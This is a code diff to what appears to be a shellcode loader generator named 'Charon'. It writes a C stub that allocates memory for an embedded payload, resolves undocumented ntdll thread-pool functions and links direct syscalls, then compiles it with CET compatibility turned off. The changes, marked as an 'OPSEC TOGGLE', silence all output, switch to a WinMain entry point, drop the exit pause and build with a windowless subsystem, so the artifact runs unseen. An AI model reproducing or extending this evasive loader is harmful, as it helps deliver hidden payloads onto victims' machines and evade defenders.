@@ -235,8 +235,8 @@ const char *g_StubTemplate =
     "#define DEFAULT_FRAME_SIZE 0x28\n"
     "\n"
     // --- OPSEC TOGGLE ---
-    // Uncomment the line below to silence all prints for Production
-    "// #define printf(...) \n"
+    // Comment the line below to enable debug prints
+    "#define printf(...) \n"
     "\n"
 
     // -------------------------------------------------------------------------
@@ -614,8 +614,10 @@ const char *g_StubTemplate =
     // -------------------------------------------------------------------------
     // [ENTRY POINT]
     // -------------------------------------------------------------------------
-    "int main() {\n"
-    "    setvbuf(stdout, NULL, _IONBF, 0);\n"
+    // Uncomment main and comment WinMain to enable console mode
+    // "int main() {\n"
+    "   int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {\n"
+    // "    setvbuf(stdout, NULL, _IONBF, 0);\n"
     "    PVOID pAddr = NULL; SIZE_T sSize = sizeof(Payload); DWORD dwOld = 0; "
     "HANDLE hProc = (HANDLE)-1;\n"
     "    \n"
@@ -742,7 +744,7 @@ const char *g_StubTemplate =
     "    ((fnTpReleaseWork)GetProcAddress(hNt, \"TpReleaseWork\"))(pWork);\n"
     "\n"
     "    printf(\"[+] Finished. Press Enter to exit.\\n\");\n"
-    "    getchar();\n"
+    // "    getchar();\n"
     "    return 0;\n"
     "}\n";
 
@@ -961,8 +963,12 @@ int main(int argc, char *argv[]) {
   // Compile the artifact C code and link it with the assembly object.
   // -----------------------------------------------------------------------
   printf("[*] Compiling Artifact (CL)...\n");
+  // Uncomment to enable console mode
+  // int res = system("cl /nologo /O2 artifact.c syscalls.obj "
+  //                 "/Fe:CharonArtifact.exe /link /CETCOMPAT:NO");
+
   int res = system("cl /nologo /O2 artifact.c syscalls.obj "
-                   "/Fe:CharonArtifact.exe /link /CETCOMPAT:NO");
+                  "/Fe:CharonArtifact.exe /link /CETCOMPAT:NO /SUBSYSTEM:WINDOWS");
 
   // -----------------------------------------------------------------------
   // [BUILD STEP 7] Cleanup
